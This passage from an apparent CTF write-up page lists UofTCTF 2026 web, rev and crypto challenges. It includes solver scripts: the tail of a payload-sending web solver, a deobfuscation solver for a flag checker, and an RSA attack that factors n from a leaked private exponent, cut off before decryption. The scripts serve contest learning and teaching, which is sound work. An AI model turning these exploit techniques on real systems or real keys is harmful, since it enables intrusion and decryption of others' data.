</span></span><span class=line><span class=cl>            <span class=n>flag</span> <span class=o>=</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;uoftctf{&#34;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s2>&#34;}&#34;</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] Flag found: uoftctf</span><span class=se>{{</span><span class=si>{</span><span class=n>flag</span><span class=si>}</span><span class=se>}}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Payload executed, but no flag in response.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Response content:&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[-] Unexpected response.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Status: </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>status_code</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;URL: </span><span class=si>{</span><span class=n>response</span><span class=o>.</span><span class=n>url</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>solve</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=firewall--状态runningreproduction>Firewall | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Free flag at /flag.html</p><p>​<code>curl http://35.227.38.232:5000</code>​</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=personal-blog--状态runningreproduction>Personal Blog | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>For your eyes only?</p><p>Visit the website <a href=http://34.26.148.28:5000/>here</a>.</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=no-quotes-2--状态runningreproduction>No Quotes 2 | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Unless it&rsquo;s from &ldquo;Go Go Squid!&rdquo;, no quotes are allowed here! Let this wholesome quote heal your soul:</p><p>Ai Qing: &ldquo;If you didn&rsquo;t know about robot combat back then, what would you be doing?&rdquo;</p><p>Wu Bai: &ldquo;There&rsquo;s no if. As long as you&rsquo;re here, I&rsquo;ll be here.&rdquo;</p><p>Now complete with a double check for extra security!</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=no-quotes-3--状态runningreproduction>No Quotes 3 | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Unless it&rsquo;s from &ldquo;Go Go Squid!&rdquo;, no quotes are allowed here! Let this wholesome quote heal your soul:</p><p>Ai Qing: &ldquo;If you didn&rsquo;t know about robot combat back then, what would you be doing?&rdquo;</p><p>Wu Bai: &ldquo;There&rsquo;s no if. As long as you&rsquo;re here, I&rsquo;ll be here.&rdquo;</p><p>Now complete with a double check for extra security AND ​<strong>proper hashing</strong>!</p><p>(The author also hates <strong>periods</strong> and is 6'7" btw)</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=pasteboard--状态runningreproduction>Pasteboard | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>For Team K&amp;K, dating is forbidden. So Mi Shaofei and Sun Yaya hide their relationship the only way they can: by slipping messages into a notes sharing app.</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=unrealistic-client-side-challenge---flag-1--状态runningreproduction>Unrealistic Client-Side Challenge - Flag 1 | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Han Shangyan was tired of Team K&amp;K getting skill-diffed every time they were faced with client-side web challenges. After some self-reflection, he finally accepted that training his squad solely with aim trainers <em>might</em> not be the best approach. Instead, he decided to make a <em>totally realistic</em> CTF challenge for his team to practice on.</p><p>Submit flag 1 here. Both challenges use the same attachment.</p><p>Note: Port 5001 is not exposed on the remote instance. However, the bot can still access it and this does not interfere with the intended solution.</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=vulnerability-research--状态runningreproduction>Vulnerability Research | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Inspired by the recent <strong>10.0 CVSS</strong> react2shell vulnerability, Han Shangyan decided to embark on a web application framework auditing journey himself. He stumbled upon this old web framework. Can you help him audit it for any bugs?</p><p>Note: This challenge involves exploiting a real 0-day. Please refrain from posting writeups or sharing details about the vulnerability publicly until it has been patched by the maintainers.</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=unrealistic-client-side-challenge---flag-2--状态runningreproduction>Unrealistic Client-Side Challenge - Flag 2 | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Han Shangyan was tired of Team K&amp;K getting skill-diffed every time they were faced with client-side web challenges. After some self-reflection, he finally accepted that training his squad solely with aim trainers <em>might</em> not be the best approach. Instead, he decided to make a <em>totally realistic</em> CTF challenge for his team to practice on.</p><p>Submit flag 2 here. Both challenges use the same attachment.</p><p>Note: Port 5001 is not exposed on the remote instance. However, the bot can still access it and this does not interfere with the intended solution.</p><p><strong>WriteUp</strong></p><p>暂无</p><h1 id=rev>Rev</h1><h2 id=baby-obfuscated-flag-checker--状态solvedlive>Baby (Obfuscated) Flag Checker | 状态:solved｜Live</h2><p><strong>题目描述</strong></p><p>All this obfuscation has left Han Shangyan seeing double. Even Grunt refuses to untangle this mess for him, so it&rsquo;s up to you to do the real <em>grunt</em>work (hahaha get it???).</p><p>Hint: This challenge can be solved without fully deobfuscating the script, but writing a deobfuscator might help you with the &ldquo;ML Connoisseur&rdquo; challenge&mldr;</p><p><strong>WriteUp</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>lcg_random</span><span class=p>(</span><span class=n>seed</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>state</span> <span class=o>=</span> <span class=n>seed</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># Based on GGs logic:</span>
</span></span><span class=line><span class=cl>        <span class=c1># if g0gOSqu1D == 853: ... return G0Gosqu1D * 1103515245 + 12345 &amp; 2147483647</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=p>(</span><span class=n>state</span> <span class=o>*</span> <span class=mi>1103515245</span> <span class=o>+</span> <span class=mi>12345</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>2147483647</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_permutation</span><span class=p>(</span><span class=n>n</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># Based on Ggs logic</span>
</span></span><span class=line><span class=cl>    <span class=n>state</span> <span class=o>=</span> <span class=mi>195936478</span> <span class=c1># GGs_675671 initial value</span>
</span></span><span class=line><span class=cl>    <span class=n>items</span> <span class=o>=</span> <span class=nb>list</span><span class=p>(</span><span class=nb>range</span><span class=p>(</span><span class=n>n</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=n>items</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>state</span> <span class=o>=</span> <span class=n>lcg_random</span><span class=p>(</span><span class=n>state</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>idx</span> <span class=o>=</span> <span class=n>state</span> <span class=o>%</span> <span class=nb>len</span><span class=p>(</span><span class=n>items</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>items</span><span class=o>.</span><span class=n>pop</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>result</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_expected_chunk</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># G0gosQu1D data</span>
</span></span><span class=line><span class=cl>    <span class=n>ENCRYPTED_CHUNKS</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=mi>13</span><span class=p>,</span> <span class=mi>73</span><span class=p>,</span> <span class=mi>41</span><span class=p>,</span> <span class=mi>30</span><span class=p>,</span> <span class=mi>53</span><span class=p>,</span> <span class=mi>34</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=mi>8</span><span class=p>,</span> <span class=mi>18</span><span class=p>,</span> <span class=mi>27</span><span class=p>,</span> <span class=mi>9</span><span class=p>,</span> <span class=mi>30</span><span class=p>,</span> <span class=mi>9</span><span class=p>,</span> <span class=mi>27</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>25</span><span class=p>,</span> <span class=mi>76</span><span class=p>,</span> <span class=mi>25</span><span class=p>,</span> <span class=mi>34</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=mi>37</span><span class=p>,</span> <span class=mi>57</span><span class=p>,</span> <span class=mi>66</span><span class=p>,</span> <span class=mi>66</span><span class=p>,</span> <span class=mi>66</span><span class=p>,</span> <span class=mi>0</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=mi>25</span><span class=p>,</span> <span class=mi>78</span><span class=p>,</span> <span class=mi>63</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>58</span><span class=p>,</span> <span class=mi>34</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=mi>77</span><span class=p>,</span> <span class=mi>19</span><span class=p>,</span> <span class=mi>78</span><span class=p>,</span> <span class=mi>34</span><span class=p>,</span> <span class=mi>14</span><span class=p>,</span> <span class=mi>21</span><span class=p>,</span> <span class=mi>77</span><span class=p>,</span> <span class=mi>74</span><span class=p>,</span> <span class=mi>34</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=mi>73</span><span class=p>,</span> <span class=mi>19</span><span class=p>,</span> <span class=mi>34</span><span class=p>,</span> <span class=mi>76</span><span class=p>,</span> <span class=mi>49</span><span class=p>,</span> <span class=mi>48</span><span class=p>,</span> <span class=mi>34</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=mi>15</span><span class=p>,</span> <span class=mi>78</span><span class=p>,</span> <span class=mi>11</span><span class=p>,</span> <span class=mi>34</span><span class=p>,</span> <span class=mi>77</span><span class=p>,</span> <span class=mi>15</span><span class=p>,</span> <span class=mi>34</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=mi>9</span><span class=p>,</span> <span class=mi>21</span><span class=p>,</span> <span class=mi>76</span><span class=p>,</span> <span class=mi>72</span><span class=p>,</span> <span class=mi>34</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>76</span><span class=p>,</span> <span class=mi>74</span><span class=p>,</span> <span class=mi>21</span><span class=p>,</span> <span class=mi>34</span><span class=p>],</span> 
</span></span><span class=line><span class=cl>        <span class=p>[</span><span class=mi>4</span><span class=p>,</span> <span class=mi>77</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>34</span><span class=p>,</span> <span class=mi>16</span><span class=p>,</span> <span class=mi>77</span><span class=p>,</span> <span class=mi>19</span><span class=p>,</span> <span class=mi>22</span><span class=p>,</span> <span class=mi>78</span><span class=p>,</span> <span class=mi>36</span><span class=p>,</span> <span class=mi>34</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span> <span class=o>=</span> <span class=mi>125</span> <span class=c1># (90 ^ 60) + 23 &amp; 255</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>c</span> <span class=o>^</span> <span class=n>key</span><span class=p>)</span> <span class=k>for</span> <span class=n>c</span> <span class=ow>in</span> <span class=n>ENCRYPTED_CHUNKS</span><span class=p>[</span><span class=n>idx</span><span class=p>])</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_chunk_position</span><span class=p>(</span><span class=n>target_idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>CHUNK_LENGTHS</span> <span class=o>=</span> <span class=p>[</span><span class=mi>6</span><span class=p>,</span> <span class=mi>12</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>9</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mi>10</span><span class=p>,</span> <span class=mi>11</span><span class=p>]</span> <span class=c1># sQU1D</span>
</span></span><span class=line><span class=cl>    <span class=n>CHUNK_ORDER</span> <span class=o>=</span> <span class=p>[</span><span class=mi>1</span><span class=p>,</span> <span class=mi>8</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>3</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>4</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=mi>5</span><span class=p>,</span> <span class=mi>2</span><span class=p>]</span> <span class=c1># SqUId</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>pos</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>idx</span> <span class=ow>in</span> <span class=n>CHUNK_ORDER</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>idx</span> <span class=o>==</span> <span class=n>target_idx</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>pos</span>
</span></span><span class=line><span class=cl>        <span class=n>pos</span> <span class=o>+=</span> <span class=n>CHUNK_LENGTHS</span><span class=p>[</span><span class=n>idx</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>pos</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>perm</span> <span class=o>=</span> <span class=n>get_permutation</span><span class=p>(</span><span class=mi>9</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Permutation: </span><span class=si>{</span><span class=n>perm</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># Flag length is 74 (checked in line 197)</span>
</span></span><span class=line><span class=cl>    <span class=n>flag_chars</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;&#39;</span><span class=p>]</span> <span class=o>*</span> <span class=mi>74</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>idx</span> <span class=ow>in</span> <span class=n>perm</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>chunk</span> <span class=o>=</span> <span class=n>get_expected_chunk</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>pos</span> <span class=o>=</span> <span class=n>get_chunk_position</span><span class=p>(</span><span class=n>idx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Chunk </span><span class=si>{</span><span class=n>idx</span><span class=si>}</span><span class=s2>: &#39;</span><span class=si>{</span><span class=n>chunk</span><span class=si>}</span><span class=s2>&#39; at pos </span><span class=si>{</span><span class=n>pos</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span><span class=p>,</span> <span class=n>c</span> <span class=ow>in</span> <span class=nb>enumerate</span><span class=p>(</span><span class=n>chunk</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>pos</span> <span class=o>+</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>74</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>flag_chars</span><span class=p>[</span><span class=n>pos</span> <span class=o>+</span> <span class=n>i</span><span class=p>]</span> <span class=o>=</span> <span class=n>c</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Error: Index out of bounds </span><span class=si>{</span><span class=n>pos</span><span class=o>+</span><span class=n>i</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Flag:&#34;</span><span class=p>,</span> <span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=n>flag_chars</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>solve</span><span class=p>()</span>
</span></span></code></pre></td></tr></table></div></div><h2 id=bring-your-own-program--状态runningreproduction>Bring Your Own Program | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Team K&amp;K discovered a mysterious emulator for an unknown architecture. I wonder what kind of programs it can run&mldr;</p><p>​<code>nc 35.245.96.82 5000</code>​</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=symbol-of-hope--状态runningreproduction>Symbol of Hope | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Like a beacon in the dark, Go Go Squid! stands as a symbol of hope to those who seek to be healed.</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=will-u-accept-some-magic--状态runningreproduction>Will u Accept Some Magic? | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>How does Kotlin compile to wasm so well? Where did my heap go?</p><p>Wrap the password in uoftctf{}</p><p><strong>WriteUp</strong></p><p>暂无</p><h2 id=ml-connoisseur--状态runningreproduction>ML Connoisseur | 状态:running｜Reproduction</h2><p><strong>题目描述</strong></p><p>Tong Nian is a talented machine learning student. She claims to have built a classifier, but never revealed what it is supposed to recognize. The model behaves oddly, and its purpose is unclear. Can you figure out what it&rsquo;s really classifying?</p><p>Download: <a href=https://uoftctf-2026-downloads.uoftctf.org/ml-connoisseur.zip>https://uoftctf-2026-downloads.uoftctf.org/ml-connoisseur.zip</a></p><p>Example usage: <code>python chal.py examples/0.png</code>​</p><p><strong>WriteUp</strong></p><p>暂无</p><h1 id=crypto>Crypto</h1><h2 id=leaked-d--状态solvedlive>Leaked d | 状态:solved｜Live</h2><p><strong>题目描述</strong></p><p>Someone leaked my d, surely generating a new key pair is safe enough.</p><p>n1=144193923737869044259998596038292537217126517072587407189785154961344425600188709243733103713567903690926695626210849582322575275021963176688615503362430255878068025864333805901831356111202249176714839010151878345993886718863579928588098080351940561045688931786378656665718140998014299097023143181095121810219</p><p>e1=65537</p><p>d1=12574092103116126584156918631595005114605155027996964036950457918490065036621732354668884564796078087090438462300608898225025828108557296714458055780952572974382089675780912070693778415852291145766476219909978391880801604060224785419022793121117332853938170749724540897211958251465747669952580590146500249193</p><p>e2=6767671</p><p>c=31703515320997441500407462163885912085193988887521686491271883832485018463764003313655377418478488372329742364292629844576532415828605994734718987367062694340608380583593689052813716395874850039382743513756381017287371000882358341440383454299152364807346068866304481227367259672607408256375720022838698292966</p><p><strong>WriteUp</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=n>inverse</span><span class=p>,</span> <span class=n>long_to_bytes</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>math</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ================== 已知参数 ==================</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=mi>144193923737869044259998596038292537217126517072587407189785154961344425600188709243733103713567903690926695626210849582322575275021963176688615503362430255878068025864333805901831356111202249176714839010151878345993886718863579928588098080351940561045688931786378656665718140998014299097023143181095121810219</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>e1</span> <span class=o>=</span> <span class=mi>65537</span>
</span></span><span class=line><span class=cl><span class=n>d1</span> <span class=o>=</span> <span class=mi>12574092103116126584156918631595005114605155027996964036950457918490065036621732354668884564796078087090438462300608898225025828108557296714458055780952572974382089675780912070693778415852291145766476219909978391880801604060224785419022793121117332853938170749724540897211958251465747669952580590146500249193</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>e2</span> <span class=o>=</span> <span class=mi>6767671</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=mi>31703515320997441500407462163885912085193988887521686491271883832485018463764003313655377418478488372329742364292629844576532415828605994734718987367062694340608380583593689052813716395874850039382743513756381017287371000882358341440383454299152364807346068866304481227367259672607408256375720022838698292966</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ================== Step 1: 恢复 φ(n) ==================</span>
</span></span><span class=line><span class=cl><span class=n>k</span> <span class=o>=</span> <span class=n>e1</span> <span class=o>*</span> <span class=n>d1</span> <span class=o>-</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 尝试分解 k = φ(n) * t</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>t</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1_000_000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>k</span> <span class=o>%</span> <span class=n>t</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>phi</span> <span class=o>=</span> <span class=n>k</span> <span class=o>//</span> <span class=n>t</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 解二次方程 x^2 - (n - phi + 1)x + n = 0</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span> <span class=o>=</span> <span class=n>n</span> <span class=o>-</span> <span class=n>phi</span> <span class=o>+</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>delta</span> <span class=o>=</span> <span class=n>s</span> <span class=o>*</span> <span class=n>s</span> <span class=o>-</span> <span class=mi>4</span> <span class=o>*</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>delta</span> <span class=o>&lt;</span> <span class=mi>0</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>math</span><span class=o>.</span><span class=n>isqrt</span><span class=p>(</span><span class=n>delta</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>r</span> <span class=o>*</span> <span class=n>r</span> <span class=o>!=</span> <span class=n>delta</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>continue</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>p</span> <span class=o>=</span> <span class=p>(</span><span class=n>s</span> <span class=o>+</span> <span class=n>r</span><span class=p>)</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>    <span class=n>q</span> <span class=o>=</span> <span class=p>(</span><span class=n>s</span> <span class=o>-</span> <span class=n>r</span><span class=p>)</span> <span class=o>//</span> <span class=mi>2</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>p</span> <span class=o>*</span> <span class=n>q</span> <span class=o>==</span> <span class=n>n</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Found factors!&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>raise</span> <span class=ne>Exception</span><span class=p>(</span><span class=s2>&#34;Failed to factor n&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ================== Step 2: 计算新的私钥 d2 ==================</span>
</span></span><span class=line><span class=cl><span class=n>phi</span> <span class=o>=</span> <span class=p>(</span><span class=n>p</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span> <span class=o>*</span> <span class=p>(</span><span class=n>q</span> <span class=o>-</span> <span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>d2</span> <span class=o>=</span> <span class=n>inverse</span><span class=p>(</span><span class=n>e2</span><span class=p>,</span> <span class=n>phi</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># ================== Step 3: 解密 ==================</span>
